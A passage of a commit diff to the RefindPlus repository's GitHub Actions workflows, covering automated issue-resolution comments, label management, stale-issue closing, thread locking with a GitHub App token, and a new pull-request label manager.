oprypin/find-latest-tag@v1\n+        with:\n+          repository: ${{ github.repository }}\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          releases-only: true\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'Yes' && github.event.inputs.show_more_info == 'Yes' && github.event.inputs.type_more_info == 'Note' }}\n+        id: part_2_2b\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+\n+            > [!NOTE]\n+            > ${{ github.event.inputs.more_info }}\n+\n+            Thank you for taking the time to suggest improvements to RefindPlus.\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'Yes' && github.event.inputs.show_more_info == 'Yes' && github.event.inputs.type_more_info == 'Caution' }}\n+        id: part_2_2c\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+\n+            > [!CAUTION]\n+            > ${{ github.event.inputs.more_info }}\n+\n+            Thank you for taking the time to suggest improvements to RefindPlus.\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'Yes' && github.event.inputs.show_more_info == 'No' }}\n+        id: part_2_2d\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+\n+            Thank you for taking the time to suggest improvements to RefindPlus.\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'No' && github.event.inputs.show_more_info == 'Yes' && github.event.inputs.type_more_info == 'Note' }}\n+        id: part_2_3a\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\n+\n+            > [!NOTE]\n+            > ${{ github.event.inputs.more_info }}\n+\n+            Thank you for taking the time to suggest improvements to RefindPlus.\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'No' && github.event.inputs.show_more_info == 'Yes' && github.event.inputs.type_more_info == 'Caution' }}\n+        id: part_2_3b\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\n+\n+            > [!CAUTION]\n+            > ${{ github.event.inputs.more_info }}\n+\n+            Thank you for taking the time to suggest improvements to RefindPlus.\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'No' && github.event.inputs.show_more_info == 'No' }}\n+        id: part_2_3c\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\n+\n+            Thank you for taking the time to suggest improvements to RefindPlus.\n+\n+  issue_resolve_enhance3:\n+    name: Issue - Resolve - Enhance3\n+    needs: [issue_resolve_enhance2]\n+    runs-on: ubuntu-24.04\n+\n+    if: ${{ success() || failure() }}\n+    steps:\n+      - id: part_3_1\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'add-labels'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          labels: 'Resolved'\n+\n+      - id: part_3_2\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'remove-labels'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          labels: 'Accepted,Unresolved'\n+\n+  issue_resolve_enhance4:\n+    name: Issue - Resolve - Enhance4\n+    needs: [issue_resolve_enhance3]\n+    runs-on: ubuntu-24.04\n+\n+    if: ${{ success() || failure() }}\n+    steps:\n+      - if: ${{ steps.issue-get-state.outputs.isclosed == 'false' }}\n+        id: part_4_1\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'close-issue'\n+          close-reason: 'completed'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+\n+      - if: ${{ steps.issue-get-state.outputs.islocked == 'true' }}\n+        id: part_4_2\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'lock-issue'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n```\n\nFilename: .github/workflows/issue_helper_resolve_other_bug.yml:\n```\n@@ -1,4 +1,4 @@\n-name: 'Issue Helper Resolve Other'\n+name: 'Issue Helper Resolve Other Bug'\n \n on:\n   workflow_dispatch:\n\n@@ -35,8 +35,8 @@\nconcurrency:\n \n jobs:\n \n-  issue_resolve_other1:\n-    name: Issue - Resolve - Other1\n+  issue_resolve_other_bug1:\n+    name: Issue - Resolve - Other - Bug1\n     runs-on: ubuntu-24.04\n \n     steps:\n\n@@ -62,9 +62,9 @@\njobs:\n             }\n \n   # Misc Issue Items - https://github.com/actions-cool/issues-helper\n-  issue_resolve_other2:\n-    name: Issue - Resolve - Other2\n-    needs: [issue_resolve_other1]\n+  issue_resolve_other_bug2:\n+    name: Issue - Resolve - Other - Bug2\n+    needs: [issue_resolve_other_bug1]\n     runs-on: ubuntu-24.04\n \n     if: ${{ success() || failure() }}\n\n@@ -93,10 +93,9 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item has been addressed.\n-\n-            The current RefindPlus release is **${{ steps.part_2_2a.outputs.tag }}**.\n-            See [BUILDING.md](https://github.com/dakanji/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+            This item has been addressed for the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n \n             > [!NOTE]\n             > ${{ github.event.inputs.more_info }}\n\n@@ -109,10 +108,9 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item has been addressed.\n-\n-            The current RefindPlus release is **${{ steps.part_2_2a.outputs.tag }}**.\n-            See [BUILDING.md](https://github.com/dakanji/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+            This item has been addressed for the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n \n             > [!CAUTION]\n             > ${{ github.event.inputs.more_info }}\n\n@@ -125,10 +123,9 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item has been addressed.\n-\n-            The current RefindPlus release is **${{ steps.part_2_2a.outputs.tag }}**.\n-            See [BUILDING.md](https://github.com/dakanji/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+            This item has been addressed for the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n \n       - if: ${{ github.event.inputs.show_build_msg == 'No' && github.event.inputs.show_more_info == 'Yes' && github.event.inputs.type_more_info == 'Note' }}\n         id: part_2_3a\n\n@@ -138,7 +135,7 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item has been addressed.\n+            This item has been addressed for the next RefindPlus release.\n \n             > [!NOTE]\n             > ${{ github.event.inputs.more_info }}\n\n@@ -151,7 +148,7 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item has been addressed.\n+            This item has been addressed for the next RefindPlus release.\n \n             > [!CAUTION]\n             > ${{ github.event.inputs.more_info }}\n\n@@ -164,11 +161,11 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item has been addressed.\n+            This item has been addressed for the next RefindPlus release.\n \n-  issue_resolve_other3:\n-    name: Issue - Resolve - Other3\n-    needs: [issue_resolve_other2]\n+  issue_resolve_other_bug3:\n+    name: Issue - Resolve - Other - Bug3\n+    needs: [issue_resolve_other_bug2]\n     runs-on: ubuntu-24.04\n \n     if: ${{ success() || failure() }}\n\n@@ -189,9 +186,9 @@\njobs:\n           issue-number: ${{ github.event.inputs.item_id }}\n           labels: 'Triage,Queries,Parked,Prorogued,Unclear,Uncertain,Unresolved,Acknowledged,Known-Issue'\n \n-  issue_resolve_other4:\n-    name: Issue - Resolve - Other4\n-    needs: [issue_resolve_other3]\n+  issue_resolve_other_bug4:\n+    name: Issue - Resolve - Other - Bug4\n+    needs: [issue_resolve_other_bug3]\n     runs-on: ubuntu-24.04\n \n     if: ${{ success() || failure() }}\n```\n\nFilename: .github/workflows/issue_helper_resolve_other_enhance.yml:\n```\n@@ -0,0 +1,211 @@\n+name: 'Issue Helper Resolve Other Enhance'\n+\n+on:\n+  workflow_dispatch:\n+    inputs:\n+      item_id:\n+        description: 'Item ID'\n+        required: true\n+      show_build_msg:\n+        type: choice\n+        description: 'Version Comment'\n+        options:\n+        - 'Yes'\n+        - 'No'\n+      more_info:\n+        description: 'More Info'\n+      show_more_info:\n+        type: choice\n+        description: 'Show More Info Entry'\n+        options:\n+        - 'No'\n+        - 'Yes'\n+      type_more_info:\n+        type: choice\n+        description: 'More Info Type'\n+        options:\n+        - 'Note'\n+        - 'Caution'\n+\n+permissions:\n+  issues: write\n+\n+concurrency:\n+  group: lock\n+\n+jobs:\n+\n+  issue_resolve_other_enhance1:\n+    name: Issue - Resolve - Other - Enhance1\n+    runs-on: ubuntu-24.04\n+\n+    steps:\n+      - id: issue-get-state\n+        uses: actions/github-script@v7\n+        with:\n+          github-token: ${{ secrets.GITHUB_TOKEN }}\n+          script: |\n+            const { data } = await github.rest.issues.get({\n+              owner: context.repo.owner,\n+              repo: context.repo.repo,\n+              issue_number: context.payload.inputs.item_id\n+            });\n+            if (data.locked) {\n+              console.log(\"::set-output name=islocked::true\");\n+            } else {\n+              console.log(\"::set-output name=islocked::false\");\n+            }\n+            if (data.state === 'closed') {\n+              console.log(\"::set-output name=isclosed::true\");\n+            } else {\n+              console.log(\"::set-output name=isclosed::false\");\n+            }\n+\n+  # Misc Issue Items - https://github.com/actions-cool/issues-helper\n+  issue_resolve_other_enhance2:\n+    name: Issue - Resolve - Other - Enhance2\n+    needs: [issue_resolve_other_enhance1]\n+    runs-on: ubuntu-24.04\n+\n+    if: ${{ success() || failure() }}\n+    steps:\n+      - if: ${{ steps.issue-get-state.outputs.islocked == 'true' }}\n+        id: part_2_1\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'unlock-issue'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'Yes' }}\n+        id: part_2_2a\n+        uses: oprypin/find-latest-tag@v1\n+        with:\n+          repository: ${{ github.repository }}\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          releases-only: true\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'Yes' && github.event.inputs.show_more_info == 'Yes' && github.event.inputs.type_more_info == 'Note' }}\n+        id: part_2_2b\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item has been addressed for the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+\n+            > [!NOTE]\n+            > ${{ github.event.inputs.more_info }}\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'Yes' && github.event.inputs.show_more_info == 'Yes' && github.event.inputs.type_more_info == 'Caution' }}\n+        id: part_2_2c\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item has been addressed for the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+\n+            > [!CAUTION]\n+            > ${{ github.event.inputs.more_info }}\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'Yes' && github.event.inputs.show_more_info == 'No' }}\n+        id: part_2_2d\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item has been addressed for the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'No' && github.event.inputs.show_more_info == 'Yes' && github.event.inputs.type_more_info == 'Note' }}\n+        id: part_2_3a\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item has been addressed for the next RefindPlus release.\n+\n+            > [!NOTE]\n+            > ${{ github.event.inputs.more_info }}\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'No' && github.event.inputs.show_more_info == 'Yes' && github.event.inputs.type_more_info == 'Caution' }}\n+        id: part_2_3b\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item has been addressed for the next RefindPlus release.\n+\n+            > [!CAUTION]\n+            > ${{ github.event.inputs.more_info }}\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'No' && github.event.inputs.show_more_info == 'No' }}\n+        id: part_2_3c\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'create-comment'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          body: |\n+            This item has been addressed for the next RefindPlus release.\n+\n+  issue_resolve_other_enhance3:\n+    name: Issue - Resolve - Other - Enhance3\n+    needs: [issue_resolve_other_enhance2]\n+    runs-on: ubuntu-24.04\n+\n+    if: ${{ success() || failure() }}\n+    steps:\n+      - id: part_3_1\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'add-labels'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          labels: 'Resolved'\n+\n+      - id: part_3_2\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'remove-labels'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          labels: 'Accepted,Unresolved'\n+\n+  issue_resolve_other_enhance4:\n+    name: Issue - Resolve - Other - Enhance4\n+    needs: [issue_resolve_other_enhance3]\n+    runs-on: ubuntu-24.04\n+\n+    if: ${{ success() || failure() }}\n+    steps:\n+      - if: ${{ steps.issue-get-state.outputs.isclosed == 'false' }}\n+        id: part_4_1\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'close-issue'\n+          close-reason: 'completed'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+\n+      - if: ${{ steps.issue-get-state.outputs.islocked == 'true' }}\n+        id: part_4_2\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'lock-issue'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n```\n\nFilename: .github/workflows/issue_labels.yml:\n```\n@@ -85,9 +85,9 @@\njobs:\n       - uses: actions-cool/issues-similarity-analysis@v1\n         with:\n           token: ${{ secrets.GITHUB_TOKEN }}\n-          since-days: 450\n+          since-days: 540\n           filter-threshold: 0.51\n-          comment-title: '### Similar Items:'\n+          comment-title: '### Similar Item(s):'\n           comment-body: '${index}. [Similarity Rating: ${similarity}] ... [${title}](https://github.com/${{ github.repository }}/issues/${number})'\n           show-footer: false\n```\n\nFilename: .github/workflows/issues-close.yml:\n```\n@@ -28,7 +28,7 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ secrets.GITHUB_TOKEN }}\n \n       - name: Handle Cancelled/Duplicate/Invalid/Wierd/Not-Planned Issues\n         uses: actions/stale@v9\n\n@@ -47,7 +47,7 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ secrets.GITHUB_TOKEN }}\n \n       - name: Handle Incomplete Issues\n         uses: actions/stale@v9\n\n@@ -73,7 +73,7 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ secrets.GITHUB_TOKEN }}\n \n       - name: Handle No-Response Issues\n         uses: actions/stale@v9\n\n@@ -99,7 +99,7 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ secrets.GITHUB_TOKEN }}\n \n       - name: Catchall Closer\n         uses: actions/stale@v9\n\n@@ -119,4 +119,4 @@\njobs:\n           exempt-assignees: 'dakanji'\n           stale-issue-label: 'Stale'\n           remove-issue-stale-when-updated: true\n-          repo-token: ${{ secrets.PAT_TOKEN }}\n+          repo-token: ${{ secrets.GITHUB_TOKEN }}\n```\n\nFilename: .github/workflows/issues-lock.yml:\n```\n@@ -18,9 +18,25 @@\nconcurrency:\n \n # Lock Threads - https://github.com/dakanji/lock-threads\n jobs:\n+  authenticate:\n+    name: GitHub App Authenticate\n+    runs-on: ubuntu-24.04\n+\n+    if: github.actor == 'dakanji' && (github.event_name == 'schedule' || github.event.inputs.job_id == 'all' || github.event.inputs.job_id == 'lock')\n+    steps:\n+      - name: Generate GitHub App Token\n+        id: app-token\n+        uses: actions/create-github-app-token@v1\n+        with:\n+          app-id: ${{ vars.APP_ID }}\n+          private-key: ${{ secrets.APP_PRIVATE_KEY }}\n+\n+    outputs:\n+      token: ${{ steps.app-token.outputs.token }}\n \n   lock-threads-01:\n     name: Lock Resolved Issues\n+    needs: [authenticate]\n     runs-on: ubuntu-24.04\n \n     if: github.actor == 'dakanji' && (github.event_name == 'schedule' || github.event.inputs.job_id == 'all' || github.event.inputs.job_id == 'lock')\n\n@@ -31,25 +47,25 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ steps.app-token.outputs.token }}\n \n       - name: Handle Thread Lock\n         uses: dakanji/lock-threads@v5\n         with:\n-          github-token: ${{ secrets.PAT_TOKEN }}\n+          github-token: ${{ steps.app-token.outputs.token }}\n           issue-lock-reason: ''\n           issue-inactive-days: '1'\n           include-any-issue-labels: 'Resolved'\n           remove-issue-labels: 'Triage, Stale, Tagged, Queries, Unresolved, Uncertain, Accepted'\n           issue-comment: |-\n             This thread is being locked.\n \n-            Please use the [Discussions Feature](https://github.com/dakanji/RefindPlus/discussions) for follow-on discussion or raise a new issue if appropriate.\n+            Please use the [Discussions Feature](https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general) for follow-on discussion or raise a new issue if appropriate.\n           process-only: 'issues'\n \n   lock-threads-02:\n     name: Lock Invalid/Not-Planned/Misc Issues\n-    needs: [lock-threads-01]\n+    needs: [authenticate, lock-threads-01]\n     runs-on: ubuntu-24.04\n \n     if: github.actor == 'dakanji' && (github.event_name == 'schedule' || github.event.inputs.job_id == 'all' || github.event.inputs.job_id == 'lock')\n\n@@ -60,25 +76,25 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ steps.app-token.outputs.token }}\n \n       - name: Handle Thread Lock\n         uses: dakanji/lock-threads@v5\n         with:\n-          github-token: ${{ secrets.PAT_TOKEN }}\n+          github-token: ${{ steps.app-token.outputs.token }}\n           issue-lock-reason: ''\n           issue-inactive-days: '2'\n           include-any-issue-labels: 'Invalid, Not-Planned, Duplicate, Cannot-Replicate, Cancelled'\n           remove-issue-labels: 'Stale, Tagged, Queries, Unresolved, Uncertain, Accepted'\n           issue-comment: |-\n             This thread is being locked.\n \n-            Please use the [Discussions Feature](https://github.com/dakanji/RefindPlus/discussions) for follow-on discussion or raise a new issue if appropriate.\n+            Please use the [Discussions Feature](https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general) for follow-on discussion or raise a new issue if appropriate.\n           process-only: 'issues'\n \n   lock-threads-03:\n     name: Lock Incomplete/Abandoned Issues\n-    needs: [lock-threads-02]\n+    needs: [authenticate, lock-threads-02]\n     runs-on: ubuntu-24.04\n \n     if: github.actor == 'dakanji' && (github.event_name == 'schedule' || github.event.inputs.job_id == 'all' || github.event.inputs.job_id == 'lock')\n\n@@ -89,12 +105,12 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ steps.app-token.outputs.token }}\n \n       - name: Handle Thread Lock\n         uses: dakanji/lock-threads@v5\n         with:\n-          github-token: ${{ secrets.PAT_TOKEN }}\n+          github-token: ${{ steps.app-token.outputs.token }}\n           issue-lock-reason: ''\n           add-issue-labels: 'Abandoned'\n           issue-inactive-days: '4'\n\n@@ -108,7 +124,7 @@\njobs:\n \n   lock-threads-04:\n     name: Lock Unclear Issues\n-    needs: [lock-threads-03]\n+    needs: [authenticate, lock-threads-03]\n     runs-on: ubuntu-24.04\n \n     if: github.actor == 'dakanji' && (github.event_name == 'schedule' || github.event.inputs.job_id == 'all' || github.event.inputs.job_id == 'lock')\n\n@@ -119,25 +135,25 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ steps.app-token.outputs.token }}\n \n       - name: Handle Thread Lock\n         uses: dakanji/lock-threads@v5\n         with:\n-          github-token: ${{ secrets.PAT_TOKEN }}\n+          github-token: ${{ steps.app-token.outputs.token }}\n           issue-lock-reason: ''\n           issue-inactive-days: '7'\n           include-any-issue-labels: 'Unclear'\n           remove-issue-labels: 'Stale, Tagged, Queries, Uncertain, Accepted'\n           issue-comment: |-\n             This thread is being locked.\n \n-            Please use the [Discussions Feature](https://github.com/dakanji/RefindPlus/discussions) for follow-on discussion or raise a new issue if appropriate.\n+            Please use the [Discussions Feature](https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general) for follow-on discussion or raise a new issue if appropriate.\n           process-only: 'issues'\n \n   lock-threads-05:\n     name: Lock Inactive Issues\n-    needs: [lock-threads-04]\n+    needs: [authenticate, lock-threads-04]\n     runs-on: ubuntu-24.04\n \n     if: github.actor == 'dakanji' && (github.event_name == 'schedule' || github.event.inputs.job_id == 'all' || github.event.inputs.job_id == 'lock')\n\n@@ -148,12 +164,12 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ steps.app-token.outputs.token }}\n \n       - name: Handle Thread Lock\n         uses: dakanji/lock-threads@v5\n         with:\n-          github-token: ${{ secrets.PAT_TOKEN }}\n+          github-token: ${{ steps.app-token.outputs.token }}\n           issue-lock-reason: ''\n           add-issue-labels: 'Resolved'\n           issue-inactive-days: '3'\n\n@@ -163,12 +179,12 @@\njobs:\n           issue-comment: |-\n             This thread is being locked.\n \n-            Please use the [Discussions Feature](https://github.com/dakanji/RefindPlus/discussions) for follow-on discussion or raise a new issue if appropriate.\n+            Please use the [Discussions Feature](https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general) for follow-on discussion or raise a new issue if appropriate.\n           process-only: 'issues'\n \n   lock-threads-06:\n     name: Lock Acknowledged/Known Issues\n-    needs: [lock-threads-05]\n+    needs: [authenticate, lock-threads-05]\n     runs-on: ubuntu-24.04\n \n     if: github.actor == 'dakanji' && (github.event_name == 'schedule' || github.event.inputs.job_id == 'all' || github.event.inputs.job_id == 'lock')\n\n@@ -179,12 +195,12 @@\njobs:\n       - name: Handle Rate Limits\n         uses: ./.github/actions/handle-rate-limits\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ steps.app-token.outputs.token }}\n \n       - name: Handle Thread Lock\n         uses: dakanji/lock-threads@v5\n         with:\n-          github-token: ${{ secrets.PAT_TOKEN }}\n+          github-token: ${{ steps.app-token.outputs.token }}\n           issue-lock-reason: ''\n           add-issue-labels: ''\n           issue-inactive-days: '40'\n\n@@ -193,5 +209,5 @@\njobs:\n           issue-comment: |-\n             This thread is being locked.\n \n-            Please use the [Discussions Feature](https://github.com/dakanji/RefindPlus/discussions) for follow-on discussion or raise a new issue if appropriate.\n+            Please use the [Discussions Feature](https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general) for follow-on discussion or raise a new issue if appropriate.\n           process-only: 'issues'\n```\n\nFilename: .github/workflows/manage_pr.yml:\n```\n@@ -0,0 +1,66 @@\n+name: PR Manager\n+\n+on:\n+  pull_request:\n+    types:\n+      - closed\n+#      - labeled\n+\n+jobs:\n+#  decline_pr:\n+#    if: github.event.action == 'labeled' && github.event.label.name == 'Declined'\n+#    runs-on: ubuntu-latest\n+#    permissions:\n+#      pull-requests: write\n+#    steps:\n+#      - name: Close PR\n+#        run: |\n+#          gh pr close ${{ github.event.pull_request.number }} --repo ${{ github.repository }}\n+#        env:\n+#          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n+\n+  manage_labels:\n+    if: github.event.action == 'closed'\n+    runs-on: ubuntu-latest\n+    permissions:\n+      pull-requests: write\n+    steps:\n+      - name: Install jq\n+        run: sudo apt-get update && sudo apt-get install -y jq\n+\n+      - name: Check PR closure reason\n+        id: pr_info\n+        run: |\n+          PR_AUTHOR=\"${{ github.event.pull_request.user.login }}\"\n+          PR_CLOSER=\"${{ github.actor }}\"\n+          LABELS=$(jq -r '.pull_request.labels[].name' <<< '${{ toJson(github.event.pull_request.labels) }}')\n+          HAS_ACCEPTED=false\n+          for label in $LABELS; do\n+            if [[ \"$label\" == \"Accepted\" ]]; then\n+              HAS_ACCEPTED=true\n+              break\n+            fi\n+          done\n+          echo \"author=$PR_AUTHOR\" >> $GITHUB_ENV\n+          echo \"closer=$PR_CLOSER\" >> $GITHUB_ENV\n+          echo \"has_accepted=$HAS_ACCEPTED\" >> $GITHUB_ENV\n+\n+      - name: Determine Action\n+        id: determine_action\n+        run: |\n+          if [[ \"${{ env.closer }}\" == \"${{ env.author }}\" ]]; then\n+            echo \"action=withdrawn\" >> $GITHUB_ENV\n+          elif [[ \"${{ env.closer }}\" == \"${{ github.repository_owner }}\" ]]; then\n+            echo \"action=declined\" >> $GITHUB_ENV\n+          else\n+            echo \"action=merged\" >> $GITHUB_ENV\n+          fi\n+\n+      - name: Remove Unwanted Labels\n+        run: |\n+          UNWANTED_LABELS=$(gh pr view ${{ github.event.pull_request.number }} --repo ${{ github.repository }} --json labels --jq '.labels[].name' | grep -E '^(Queries|Unclear|Uncertain|Parked|Prorogued)' || true)\n+          for label in $UNWANTED_LABELS; do\n+            gh pr edit ${{ github.event.pull_request.number }} --repo ${{ github.repository }} --remove-label \"$label\"\n+          done\n+        env:\n+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n```\n\nFilename: 